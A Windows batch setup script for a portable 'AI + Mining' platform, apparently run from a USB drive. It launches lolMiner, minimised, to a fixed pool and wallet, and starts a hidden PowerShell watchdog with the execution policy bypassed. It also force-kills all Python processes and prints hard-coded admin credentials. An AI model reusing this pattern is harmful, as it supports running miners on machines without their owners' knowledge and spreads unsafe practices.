@echo off
title KVS - Portable Setup
color 0B
echo.
echo  ============================================
echo   KVS - Portable AI + Mining Platform
echo   Plug and Play Setup
echo  ============================================
echo.

:: Detect pendrive location
set "KVS_HOME=%~dp0"
set "KVS_DATA=%APPDATA%\KVS"
set "KVS_MINER=%KVS_DATA%\miner"
set "KVS_PYTHON=%KVS_DATA%\python"

:: Create data directories
if not exist "%KVS_DATA%" mkdir "%KVS_DATA%"
if not exist "%KVS_MINER%" mkdir "%KVS_MINER%"
if not exist "%KVS_DATA%\logs" mkdir "%KVS_DATA%\logs"

echo [1/6] Checking Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Installing portable Python...
    echo Please install Python from https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation.
    echo.
    pause
    exit /b 1
)
echo   Python found.

echo [2/6] Installing dependencies...
pip install flask requests psutil >nul 2>&1
echo   Dependencies installed.

echo [3/6] Setting up server...
if not exist "%KVS_DATA%\server.py" (
    copy "%KVS_HOME%dashboard\server.py" "%KVS_DATA%\server.py" >nul
    xcopy /E /I /Y "%KVS_HOME%dashboard\templates" "%KVS_DATA%\templates" >nul
    xcopy /E /I /Y "%KVS_HOME%dashboard\static" "%KVS_DATA%\static" >nul 2>&1
)
echo   Server files ready.

echo [4/6] Setting up miner...
if not exist "%KVS_MINER%\lolMiner.exe" (
    if exist "%KVS_HOME%miner\lolminer\lolMiner.exe" (
        copy "%KVS_HOME%miner\lolminer\lolMiner.exe" "%KVS_MINER%\lolMiner.exe" >nul
    )
)
echo   Miner ready.

echo [5/6] Starting services...
:: Kill old instances
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im lolMiner.exe >nul 2>&1
timeout /t 2 >nul

:: Start server
start /min "" python "%KVS_DATA%\server.py"
echo   Server starting on port 5000...

:: Start miner
start /min "" "%KVS_MINER%\lolMiner.exe" --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177 --pass x
echo   Miner starting...

:: Start watchdog
start /min powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%KVS_HOME%miner\watchdog.ps1"
echo   Watchdog started.

echo [6/6] Setup complete!
echo.
echo  ============================================
echo   KVS is running!
echo   Open browser: http://localhost:5000
echo   Admin login: adminkrishay / krishay123123
echo  ============================================
echo.

:: Open browser
start http://localhost:5000

:: Keep window open
pause
